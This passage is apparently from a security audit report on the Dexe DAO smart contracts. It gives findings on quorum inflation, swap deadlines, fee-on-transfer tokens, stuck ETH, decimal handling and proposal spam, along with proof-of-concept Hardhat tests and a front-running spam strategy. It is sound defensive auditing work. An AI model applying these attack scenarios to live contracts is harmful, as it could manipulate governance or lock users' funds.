          // create new MASTER & SLAVE accounts
          let MASTER = await accounts(10);
          let SLAVE  = await accounts(11);

          // mint MASTER 1 power nft
          let masterNftId = 1;
          await nftPower.mint(MASTER, masterNftId, "");

          // advance to the approximate time when nft power calculation starts
          await setTime(powerNftCalcStartTime);

          // verify MASTER's nft has current power > 0
          let masterNftCurrentPowerStart = (await nftPower.getNftPower(masterNftId)).toFixed();
          assert.equal(masterNftCurrentPowerStart, "894960000000000000000000000");
          // verify MASTER's nft has minumum power = 0
          let masterNftMinPowerStart = (await nftPower.getNftMinPower(masterNftId)).toFixed();
          assert.equal(masterNftMinPowerStart, "0");

          // MASTER deposits their nft then delegates it to SLAVE, another address they control
          await nftPower.approve(userKeeper.address, masterNftId, { from: MASTER });
          await govPool.deposit("0", [masterNftId], { from: MASTER });
          await govPool.delegate(SLAVE, "0", [masterNftId], { from: MASTER });

          // delegation triggers power recalculation on master's nft. Delegation caches
          // the minimum possible voting power of master's nft 0 and uses that for
          // slaves delegated voting power. But recalculation uses the current power
          // of Master's NFT > 0 to update the contract's total power, and this value
          // is used in the denominator of the quorum calculation
          assert.equal((await nftPower.totalPower()).toFixed(), "894690000000000000000000000");

          // mint THIRD some voting tokens & deposit them
          let thirdTokens = wei("1000");
          await token.mint(THIRD, thirdTokens);
          await token.approve(userKeeper.address, thirdTokens, { from: THIRD });
          await govPool.deposit(thirdTokens, [], { from: THIRD });

          // create a proposal
          let proposalId = 1;
          await govPool.createProposal("",
            [[govPool.address, 0, getBytesDelegateTreasury(THIRD, wei("1"), [])]], [], { from: THIRD });

          // MASTER uses their SLAVE account to vote on the proposal; this reverts
          // as delegation saved the minimum possible voting power of MASTER's nft 0
          // and uses 0 as the voting power
          await truffleAssert.reverts(
            govPool.vote(proposalId, true, 0, [], { from: SLAVE }),
            "Gov: low voting power"
          );

          // MASTER has the one & only power nft
          // It has current power   = 894690000000000000000000000
          // nft.Power.totalPower() = 894690000000000000000000000
          // This value will be used in the denominator of the quorum calculation
          // But in practice its actual voting power is 0 since the minumum
          // possible voting power is used for voting power in delegation, causing
          // the quorum denominator to be over-inflated
        });
```

Also due to the significant refactoring in this area, here is the updated PoC we used to verify the fix:

```javascript
        it("audit verified: nft totalPower > 0 when all nfts lost power incorrectly makes it impossible to reach quorum", async () => {
          // required so we can call .toFixed() on BN returned outputs
          ERC721RawPower.numberFormat = "BigNumber";

          // time when nft power calculation starts
          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

          // create a new nft power token with max power same as voting token's
          // total supply; since we only mint 1 nft this keeps PoC simple
          let voterTokens = wei("190000000000000000000");

          let newNftPower = await ERC721RawPower.new();
          await newNftPower.__ERC721RawPower_init(
            "NFTPowerMock",
            "NFTPM",
            powerNftCalcStartTime,
            token.address,
            toPercent("0.01"),
            voterTokens,
            "540"
          );

          // ERC721Power.totalPower should be zero as no nfts yet created
          assert.equal((await newNftPower.totalPower()).toFixed(), "0");

          // so proposal doesn't need to go to validators
          await changeInternalSettings(false);

          // set newNftPower as the voting nft
          // need to comment out check preventing updating existing
          // nft address in GovUserKeeper::setERC721Address()
          await impersonate(govPool.address);
          // individualPower & supply params not used for power nfts
          await userKeeper.setERC721Address(newNftPower.address, "0", 0, { from: govPool.address });

          // create a new VOTER account and mint them the only power nft
          let VOTER = await accounts(10);
          let voterNftId = 1;
          await newNftPower.mint(VOTER, voterNftId, "");

          // switch to using a new ERC20 token for voting; lets us
          // control exactly who has what voting power without worrying about
          // what previous setups have done
          // requires commenting out require statement in GovUserKeeper::setERC20Address()
          let newVotingToken = await ERC20Mock.new("NEWV", "NEWV", 18);
          await impersonate(govPool.address);
          await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });

          // mint VOTER some tokens that when combined with their NFT are enough
          // to reach quorum
          await newVotingToken.mint(VOTER, voterTokens);
          await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });
          await newNftPower.approve(userKeeper.address, voterNftId, { from: VOTER });

          // VOTER deposits their tokens & nft to have voting power
          await govPool.deposit(voterTokens, [voterNftId], { from: VOTER });

          // advance to the approximate time when nft power calculation starts
          await setTime(powerNftCalcStartTime);

          // verify nft power after power calculation has started
          assert.equal((await newNftPower.totalPower()).toFixed(), voterTokens);

          // create a proposal
          let proposal1Id = 2;

          await govPool.createProposal(
            "example.com",
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
          ,{from : VOTER});

          // vote on first proposal
          await govPool.vote(proposal1Id, true, voterTokens, [voterNftId], { from: VOTER });

          // advance time to allow proposal state change
          await setTime((await getCurrentBlockTime()) + 10);

          // verify that proposal has reached quorum;
          // VOTER's tokens & nft was enough to reach quorum'
          // since VOTER owns all the voting erc20s & power nfts
          //
          // fails here; proposal still in Voting state?
          assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

          // advance time; since VOTER's nft doesn't have collateral deposited
          // its power will decrement to zero
          await setTime((await getCurrentBlockTime()) + 10000);

          // create 2nd proposal
          let proposal2Id = 3;

          await govPool.createProposal(
            "example.com",
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
          ,{from : VOTER});

          // vote on second proposal
          await govPool.vote(proposal2Id, true, voterTokens, [voterNftId], { from: VOTER });

          // advance time to allow proposal state change
          await setTime((await getCurrentBlockTime()) + 10);

          // this used to fail as the proposal would fail to reach quorum
          // but now it works
          assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);
        });
```

**Dexe:**
We are aware of this inflation thing. Unfortunately, this is probably a sacrifice we have to make. Given the business logic of power NFT, we are caught between two stools. Either loops with "current power" (which doesn't work for delegatees as potentially the whole supply could be delegated to a single user) or with minimal power and quorum inflation.

The second option seems to be better and much more elegant. Also it incentivises users to add collateral to their NFTs.

\clearpage
## Medium Risk


### Using `block.timestamp` for swap deadline offers no protection

**Description:** `block.timestamp` is used as the deadline for swaps in `PriceFeed::exchangeFromExact()` [L106](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L106) & `PriceFeed::exchangeToExact()` [L151](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L151).

In the PoS model, proposers know well in advance if they will propose one or consecutive blocks ahead of time. In such a scenario, a malicious validator can hold back the transaction and execute it at a more favourable block number.

**Impact:** This offers no protection as `block.timestamp` will have the value of whichever block the txn is inserted into, hence the txn can be held indefinitely by malicious validators.

**Recommended Mitigation:** Consider allowing function caller to specify swap deadline input parameter.

**Dexe:**
Functionality removed.


### Use `ERC721::_safeMint()` instead of `_mint()`

**Description:** Use `ERC721::_safeMint()` instead of `ERC721::_mint()` in `AbstractERC721Multiplier::_mint()` [L89](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol#L89) & `ERC721Expert::mint()` [L30](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Expert.sol#L30).

**Impact:** Using `ERC721::_mint()` can mint ERC721 tokens to addresses which don't support ERC721 tokens, while `ERC721::_safeMint()` ensures that ERC721 tokens are only minted to addresses which support them. OpenZeppelin [discourages](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/token/ERC721/ERC721.sol#L275) the use of `_mint()`.

If the project team believes the usage of `_mint()` is correct in this case, a reason why should be documented in the code where it occurs.

**Recommended Mitigation:** Use `_safeMint()` instead of `_mint()` for ERC721.

**Dexe:**
We wont use `_safeMint()` because:

1. It opens up potential re-entrancy vulnerabilities,
2. The decision over mints is decided by DAOs. We wont limit them in terms of who to send tokens to.


### Using fee-on-transfer tokens to fund distribution proposals creates under-funded proposals which causes claiming rewards to revert

**Description:** `DistributionProposal::execute()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67) doesn't account for Fee-On-Transfer tokens but sets `proposal.rewardAmount` to the input `amount` parameter.

**Impact:** Users can't claim their rewards as `DistributionProposal::claim()` will revert since the distribution proposal will be under-funded as the fee-on-transfer token transferred `amount-fee` tokens into the `DistributionProposal` contract.

**Proof of Concept:** First add a new file `mock/tokens/ERC20MockFeeOnTransfer.sol`:
```solidity
// Copyright (C) 2017, 2018, 2019, 2020 dbrock, rain, mrchico, d-xo
// SPDX-License-Identifier: AGPL-3.0-only

// adapted from https://github.com/d-xo/weird-erc20/blob/main/src/TransferFee.sol

pragma solidity >=0.6.12;

contract Math {
    // --- Math ---
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x);
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x);
    }
}

contract WeirdERC20 is Math {
    // --- ERC20 Data ---
    string  public   name;
    string  public   symbol;
    uint8   public   decimals;
    uint256 public   totalSupply;
    bool    internal allowMint = true;

    mapping (address => uint)                      public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);

    // --- Init ---
    constructor(string memory _name,
                string memory _symbol,
                uint8 _decimalPlaces) public {
        name     = _name;
        symbol   = _symbol;
        decimals = _decimalPlaces;
    }

    // --- Token ---
    function transfer(address dst, uint wad) virtual public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {
        require(balanceOf[src] >= wad, "WeirdERC20: insufficient-balance");
        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
            require(allowance[src][msg.sender] >= wad, "WeirdERC20: insufficient-allowance");
            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);
        }
        balanceOf[src] = sub(balanceOf[src], wad);
        balanceOf[dst] = add(balanceOf[dst], wad);
        emit Transfer(src, dst, wad);
        return true;
    }
    function approve(address usr, uint wad) virtual public returns (bool) {
        allowance[msg.sender][usr] = wad;
        emit Approval(msg.sender, usr, wad);
        return true;
    }

    function mint(address to, uint256 _amount) public {
        require(allowMint, "WeirdERC20: minting is off");

        _mint(to, _amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "WeirdERC20: mint to the zero address");

        totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            balanceOf[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }

    function burn(address from, uint256 _amount) public {
        _burn(from, _amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "WeirdERC20: burn from the zero address");

        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount, "WeirdERC20: burn amount exceeds balance");
        unchecked {
            balanceOf[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function toggleMint() public {
        allowMint = !allowMint;
    }
}

contract ERC20MockFeeOnTransfer is WeirdERC20 {

    uint private fee;

    // --- Init ---
    constructor(string memory _name,
                string memory _symbol,
                uint8 _decimalPlaces,
                uint _fee) WeirdERC20(_name, _symbol, _decimalPlaces) {
        fee = _fee;
    }

    // --- Token ---
    function transferFrom(address src, address dst, uint wad) override public returns (bool) {
        require(balanceOf[src] >= wad, "ERC20MockFeeOnTransfer: insufficient-balance");
        // don't worry about allowances for this mock
        //if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
        //    require(allowance[src][msg.sender] >= wad, "ERC20MockFeeOnTransfer insufficient-allowance");
        //    allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);
        //}

        balanceOf[src] = sub(balanceOf[src], wad);
        balanceOf[dst] = add(balanceOf[dst], sub(wad, fee));
        balanceOf[address(0)] = add(balanceOf[address(0)], fee);

        emit Transfer(src, dst, sub(wad, fee));
        emit Transfer(src, address(0), fee);

        return true;
    }
}
```

Then change  `test/gov/proposals/DistributionProposal.test.js` to:

* add new line L24 `const ERC20MockFeeOnTransfer = artifacts.require("ERC20MockFeeOnTransfer");`
* add new line L51 `ERC20MockFeeOnTransfer.numberFormat = "BigNumber";`
* Add this PoC under the section `describe("claim()", () => {`:
```javascript
      it("using fee-on-transfer tokens to fund distribution proposals prevents claiming rewards", async () => {
        // create fee-on-transfer token with 1 wei transfer fee
        // this token also doesn't implement approvals so don't need to worry about that
        let feeOnTransferToken
          = await ERC20MockFeeOnTransfer.new("MockFeeOnTransfer", "MockFeeOnTransfer", 18, wei("1"));

        // mint reward tokens to sending address
        await feeOnTransferToken.mint(govPool.address, wei("10"));

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [feeOnTransferToken.address, 0, getBytesApprove(dp.address, wei("10"))],
            [dp.address, 0, getBytesDistributionProposal(1, feeOnTransferToken.address, wei("10"))],
          ],
          [],
          { from: SECOND }
        );

        // attempt to fully fund the proposal using the fee-on-transfer reward token
        await impersonate(govPool.address);
        await dp.execute(1, feeOnTransferToken.address, wei("10"), { from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // attempting to claim the reward fails as the proposal is under-funded
        // due to the fee-on-transfer token transferring less into the DistributionProposal
        // contract than the inputted amount
        await truffleAssert.reverts(dp.claim(SECOND, [1]), "Gov: insufficient funds");
      });
```

Run with `npx hardhat test --grep "fee-on-transfer"`

**Recommended Mitigation:** Consider one of the two options:

1. Don't support the fee-on-transfer tokens for the current version. Mention clearly on the website, official documentation that such tokens should not be used by DAO pools, both as governance tokens or sale tokens.

2. If fee-on-transfer tokens are to be supported, `DistributionProposal::execute()` should:
* check the contract's current erc20 balance for the reward token,
* transfer in the erc20 tokens,
* calculate actual change in the contract's balance for the reward token and set that as the reward amount.

Other places that may require similar fixes to support Fee-On-Transfer tokens:
* `TokenSaleProposalWhitelist::lockParticipationTokens()`
* `GovUserKeeper::depositTokens()`
* `GovPool::delegateTreasury()`

Recommend the project add comprehensive unit & integration tests exercising all functionality of the system using Fee-On-Transfer tokens. Also recommend project consider whether it wants to support Rebasing tokens and implement similar unit tests for Rebasing tokens. If the project no longer wishes to support Fee-On-Transfer tokens this should be made clear to users.

**Dexe:**
We will not support fee-on-transfer tokens throughout the system. There are many internal transfers of tokens between contracts during the flow; supporting fee-on-transfer tokens will result in bad UX and huge commissions for the end users.


### Distribution proposals simultaneously funded by both ETH and ERC20 tokens results in stuck eth

**Description:** [`DistributionProposal::execute()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L49-L69) allows distribution proposals to be simultaneously funded by both eth & erc20 tokens in the same transaction.

**Impact:** When this occurs claiming rewards only releases the erc20 tokens - the eth is permanently stuck in the `DistributionProposal` contract.

**Proof of Concept:** Add the PoC to `test/gov/proposals/DistributionProposal.test.js` under the section `describe("claim()", () => {`:
```javascript
      it("audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth", async () => {
        // DistributionProposal eth balance starts at 0
        let balanceBefore = toBN(await web3.eth.getBalance(dp.address));
        assert.equal(balanceBefore, 0);

        // mint reward tokens to sending address
        await token.mint(govPool.address, wei("10"));

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [token.address, 0, getBytesApprove(dp.address, wei("10"))],
            [dp.address, 0, getBytesDistributionProposal(1, token.address, wei("10"))],
          ],
          [],
          { from: SECOND }
        );

        // fully fund the proposal using both erc20 token and eth at the same time
        await impersonate(govPool.address);
        await token.approve(dp.address, wei("10"), { from: govPool.address });
        await dp.execute(1, token.address, wei("10"), { value: wei(10), from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // claiming the reward releases the erc20 tokens but the eth remains stuck
        await dp.claim(SECOND, [1]);

        // DistributionProposal eth balance at 10 wei, reward eth is stuck
        let balanceAfter = toBN(await web3.eth.getBalance(dp.address));
        assert.equal(balanceAfter, wei("10"));
      });
```
Run with `npx hardhat test --grep "audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth"`

**Recommended Mitigation:** `DistributionProposal::execute()` should revert if `token != ETHEREUM_ADDRESS && msg.value > 0`.

Similar fixes will need to be made in places where the same issue appears:
* `TokenSaleProposalBuy::buy()`
* `TokenSaleProposalWhitelist::lockParticipationTokens()`

**Dexe:**

Fixed in commits [5710f31](https://github.com/dexe-network/DeXe-Protocol/commit/5710f31a515b40fab27d55e55adc3df19efca489#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f) & [64bbcf5](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6).

**Cyfrin:** Verified.



### Lack of validations on critical Token Sale parameters can allow malicious DAO Pool creators to DOS claims by token sale participants

**Description:** When creating a tier, a DAO Pool creator can define custom token sale parameters. These parameters are verified in the `TokenSaleProposalCreate::_validateTierInitParams`. However, this function misses some crucial validations that can potentially deny token sale participants from claiming the DAO tokens they purchased.

1. `TierInitParams::saleEndTime` - An indefinitely long sale duration can deny early token sale participants from claiming within a reasonable time
2. `TierInitParams::claimLockDuration` - An indefinitely long claim lock duration can deny token sale participants from claiming
3. `VestingSettings::vestingDuration` - An indefinitely long vesting duration would mean that sale participants will have to wait forever to be fully vested
4. `VestingSettings::cliffPeriod` - An indefinitely long cliff period will prevent users from claim their vested tokens


**Impact:** All the above have a net effect of DOSing legitimate claims of token sale participants

**Recommended Mitigation:** Consider having global variables that enforce reasonable limits for such parameters. Since DAO pool creators can be malicious, the protocol needs to introduce checks that protect the naive/first-time participants.

**Dexe:**
Fixed in commit [440b8b3](https://github.com/dexe-network/DeXe-Protocol/commit/440b8b3534d58d16df781b402503be5a64d5d576) by adding validation of `claimLockDuration <= cliffPeriod` vesting period. Regarding the other suggestions we want to allow DAOs as much freedom as possible; if a DAO decides to create a token sale in 100 years, we don't want to limit them.


### Inconsistent decimal treatment for token amounts across codebase increases security risks for users interacting with Dexe DAO contracts

**Description:** Inconsistencies have been identified within the codebase regarding the assumed decimal format for token amounts. Some sections of the codebase assume token amounts to be in their native token decimals, converting them to 18 decimals when needed, while other sections assume all token amounts to be in 18 decimals. This inconsistency poses potential issues

_User Confusion_: Users may find it challenging to determine whether they should provide token amounts in their native token decimals or in 18 decimals, leading to confusion.

_Validation Errors_: In certain scenarios, these inconsistencies could result in incorrect validations. For instance, comparing amounts in different decimal formats could lead to inaccurate results, creating a situation akin to comparing apples to oranges.

_Incorrect Transfers_: There is also the risk of incorrect token transfers due to assumptions about the decimal format. Incorrectly normalised amounts might result in unintended token transfers.

For eg. when initiating a new token sale proposal via `TokenSaleProposalCreate::createTier`, the function normalises tier parameters: `minAllocationPerUser`, `maxAllocationPerUser`, and `totalTokenProvided` from token decimals to 18 decimals.

`TokenSaleProposalCreate::createTier`
```solidity
  function createTier(
        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,
        uint256 newTierId,
        ITokenSaleProposal.TierInitParams memory _tierInitParams
    ) external {
        _validateTierInitParams(_tierInitParams);

        uint256 saleTokenDecimals = _tierInitParams.saleTokenAddress.decimals();
        uint256 totalTokenProvided = _tierInitParams.totalTokenProvided;

  >      _tierInitParams.minAllocationPerUser = _tierInitParams.minAllocationPerUser.to18(
            saleTokenDecimals
        ); //@audit -> normalised to 18 decimals
   >    _tierInitParams.maxAllocationPerUser = _tierInitParams.maxAllocationPerUser.to18(
            saleTokenDecimals
        ); //@audit -> normalised to 18 decimals
   >     _tierInitParams.totalTokenProvided = totalTokenProvided.to18(saleTokenDecimals); //@audit -> normalised to 18 decimals

        ....
}
```
However, when a participant invokes `TokenSalePropsal::buy`, the sale token amount (derived from the purchase token's exchange rate) is assumed to be in 18 decimals. `TokenSaleProposalBuy::getSaleTokenAmount` function compares this amount with the tier minimum & maximum allocations per user.

`TokenSaleProposalBuy::getSaleTokenAmount`
```solidity
  function getSaleTokenAmount(
        ITokenSaleProposal.Tier storage tier,
        address user,
        uint256 tierId,
        address tokenToBuyWith,
        uint256 amount
    ) public view returns (uint256) {
        ITokenSaleProposal.TierInitParams memory tierInitParams = tier.tierInitParams;
     require(amount > 0, "TSP: zero amount");
        require(canParticipate(tier, tierId, user), "TSP: cannot participate");
        require(
            tierInitParams.saleStartTime <= block.timestamp &&
                block.timestamp <= tierInitParams.saleEndTime,
            "TSP: cannot buy now"
        );

        uint256 exchangeRate = tier.rates[tokenToBuyWith];
>        uint256 saleTokenAmount = amount.ratio(exchangeRate, PRECISION); //@audit -> this saleTokenAmount is in  saleToken decimals -> unlike in the createTier function, this saleTokenAmount is not normalised to 18 decimals

        require(saleTokenAmount != 0, "TSP: incorrect token");

    >     require(
            tierInitParams.maxAllocationPerUser == 0 ||
                (tierInitParams.minAllocationPerUser <= saleTokenAmount &&
                    saleTokenAmount <= tierInitParams.maxAllocationPerUser),
            "TSP: wrong allocation"
        ); //@audit checks sale token amount is in valid limits
        require(
            tier.tierInfo.totalSold + saleTokenAmount <= tierInitParams.totalTokenProvided,
            "TSP: insufficient sale token amount"
        ); //@audit checks total sold is less than total provided
}
```

Other instances where token amounts are assumed to be in token decimals are:

- `TokenSaleProposalCreate::_setParticipationInfo` used to set participation amounts in token sale creation proposal
- `DistributionProposal::execute` used to execute a reward distribution proposal


**Impact:** Inconsistent token amount representation can trigger erroneous validations or wrong transfers.

**Recommended Mitigation:** When handling token amounts in your protocol, it's crucial to adopt a standardised approach for token decimals. Consider following one of below mentioned conventions while handling token decimals:

_Native Token Decimals_: In this convention, each token amount is assumed to be represented in its native token's decimal format. For instance, 100 in USDC represents a token amount of 100 * 10^6, whereas 100 in DAI represents a token amount of 100 * 10^18. In this approach, the protocol takes on the responsibility of ensuring correct token decimal normalisations.

_Fixed 18 Decimals_: Alternatively, you can assume that every token amount passed into any function is always in 18 decimals. However, it places the responsibility on the user to make the necessary token decimal normalisations.

While both options are viable, we strongly recommend option 1. It aligns with industry standards, is intuitive, and minimises the potential for user errors. Given that Web3 attracts a diverse range of users, adopting option 1 allows the protocol to proactively handle the necessary conversions, enhancing user experience and reducing the chances of misunderstandings.

**Dexe:**
Fixed in commit [4a4c9d0](https://github.com/dexe-network/DeXe-Protocol/commit/4a4c9d0ee9f9f0a2fcf9d378739dafbbafa5fcf7).

**Cyfrin:** Verified. Dexe has chosen the "Fixed 18 Decimal" option where it assumes users send input token amounts in 18 decimals; this was already the default behavior in most of the code. Cyfrin continues to recommend the "Native Decimal" option where users call functions with input amounts in the token's native decimal and it is the protocol's responsibility to convert.


### Attacker can spam create identical proposals confusing users as to which is the real proposal to vote on

**Description:** If an attacker wants to interfere with the voting on a particular proposal, they can spam create many identical proposals to confuse users as to which is the "real" proposal they should vote on. Users will have to decide between which `proposalId` is the real one - why should users trust one unsigned integer over another?

**Impact:** There are 2 possible implications of creating identical-looking fake proposals:

_Vote splitting_: Users will have difficulty figuring out the real proposal from fake ones. As a result, voting may be erroneously distributed to fake proposals instead of being concentrated on the single real proposal. This griefing attack can be executed by anyone simply for the cost of gas and any tokens required to create the proposal being copied.

_Malicious actions_: Creators can camouflage malicious proposal actions by creating similar-looking proposals that are all identical in all aspects except one single malicious proposal action. It is likely that users vote without necessary due diligence.


**Proof of Concept:** Consider one variant of this attack that can be 100% automated and highly effective and distributing votes from real to fake proposals. When a create proposal transaction appears in the mempool that the attacker wants to disrupt the attacker can do 1 of 3 strategies with equal probability:

1) front-run - create 2 identical fake proposals before the real one; the real one has the greatest `proposalId`
2) sandwich - create 2 identical fake proposals on either side of the real proposal; the real one has a `proposalId` value greater than the first fake but smaller then the second fake
3) back-run - create 2  identical fake proposals after the real one; the real one has the smallest `proposalId`

**Recommended Mitigation:** Consider implementing a 'lock-period' for proposal creators' tokens, adjustable by DAO pools. Alongside a higher minimum token requirement for proposal creation, this can deter duplicate proposals and enhance the DAO's security.

**Dexe:**
We already have several protection mechanisms implemented. In order for users to create proposals, they have to deposit a configurable amount of tokens into the DAO pool. Users also can't withdraw these tokens in the same block making it impossible to create proposals using flashloans. The proposal creation costs gas which also acts as DOS protection.


### `GovPool::revoteDelegated()` doesn't support multiple tiers of delegation resulting in delegated votes not flowing through to the primary voter

**Description:** When a proposal has `delegatedVotingAllowed == false` such that automatic delegation re-voting will occur in [`GovPoolVote::revoteDelegated()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L103-L106), delegated votes don't flow through multiple tiers of delegations down to the primary voter.

**Impact:** Delegated votes through multiple tiers of delegation don't get counted as they don't flow down to the primary voter.

This issue is significant when analyzing voting behavior in established DAOs. In a presentation by [KarmaHQ](https://www.youtube.com/watch?v=ckxxujKd7ug&t=950s), it was noted that over 50% of delegates across protocols never participate in proposal voting. The current system's design, despite enabling multi-tier delegation, fails to accurately track and account for such delegated tokens.


**Proof of Concept:** Consider 1 proposal & 3 users: FINAL_VOTER, FIRST_DELEGATOR, SECOND_DELEGATOR where every user has 100 voting power.

1) FINAL_VOTER votes 100

2) FIRST_DELEGATOR delegates their 100 votes to FINAL_VOTER. This triggers the automatic cancellation & re-voting of FINAL_VOTER such that FINAL_VOTER has 200 total votes on the proposal.

3) SECOND_DELEGATOR delegates their 100 votes to FIRST_DELEGATOR. Even though FIRST_DELEGATOR has delegated their votes to FINAL_VOTER, these newly delegated votes don't flow through into FINAL_VOTER hence FINAL_VOTER's total votes is still 200.

As a user I'd expect that if I delegated my votes to another user who had also delegated their votes, my delegated votes should also flow along with theirs to the final primary voter - otherwise my delegated votes are simply lost.

Following PoC to be put in `GovPool.test.js`:

```javascript
      describe("audit tiered revoteDelegate", () => {
          // using simple to verify amounts
          let voteAmount     = wei("1000000000000000000");
          let totalVotes1Deg = wei("2000000000000000000");
          let totalVotes2Deg = wei("3000000000000000000");
          let proposal1Id    = 1;

          let FIRST_DELEGATOR;
          let SECOND_DELEGATOR;
          let FINAL_VOTER;

          beforeEach(async () => {
            FIRST_DELEGATOR  = await accounts(10);
            SECOND_DELEGATOR = await accounts(11);
            FINAL_VOTER      = await accounts(12);

            // mint tokens & deposit them to have voting power
            await token.mint(FIRST_DELEGATOR, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: FIRST_DELEGATOR });
            await govPool.deposit(FIRST_DELEGATOR, voteAmount, [], { from: FIRST_DELEGATOR });
            await token.mint(SECOND_DELEGATOR, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: SECOND_DELEGATOR });
            await govPool.deposit(SECOND_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });
            await token.mint(FINAL_VOTER, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: FINAL_VOTER });
            await govPool.deposit(FINAL_VOTER, voteAmount, [], { from: FINAL_VOTER });

            // ensure that delegatedVotingAllowed == false so automatic re-voting
            // will occur for delegation
            let defaultSettings = POOL_PARAMETERS.settingsParams.proposalSettings[0];
            assert.equal(defaultSettings.delegatedVotingAllowed, false);

            // create 1 proposal
            await govPool.createProposal("proposal1", [[token.address, 0, getBytesApprove(SECOND, 1)]], []);

            // verify delegatedVotingAllowed == false
            let proposal1 = await getProposalByIndex(proposal1Id);
            assert.equal(proposal1.core.settings[1], false);
          });

        it("audit testing 3 layer revote delegation", async () => {

          // FINAL_VOTER votes on proposal
          await govPool.vote(proposal1Id, true, voteAmount, [], { from: FINAL_VOTER });

          // verify FINAL_VOTER's voting prior to first delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            "0" // nothing delegated to AUDITOR yet
          );
          assert.equal(
            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            voteAmount
          );

          // FIRST_DELEGATOR delegates to FINAL_VOTER, this should cancel FINAL_VOTER's original votes
          // and re-vote for FINAL_VOTER which will include the delegated votes
          await govPool.delegate(FINAL_VOTER, voteAmount, [], { from: FIRST_DELEGATOR });

          // verify FINAL_VOTER's voting after first delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount // personal votes remain the same
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            voteAmount // delegated votes now included
          );
          assert.equal(
            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            totalVotes1Deg // delegated votes now included
          );

          // SECOND_DELEGATOR delegates to FIRST_DELEGATOR. These votes won't carry through into FINAL_VOTER
          await govPool.delegate(FIRST_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });

          // verify FINAL_VOTER's voting after second delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount // personal votes remain the same
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            voteAmount // delegated votes remain the same
          );
          assert.equal(
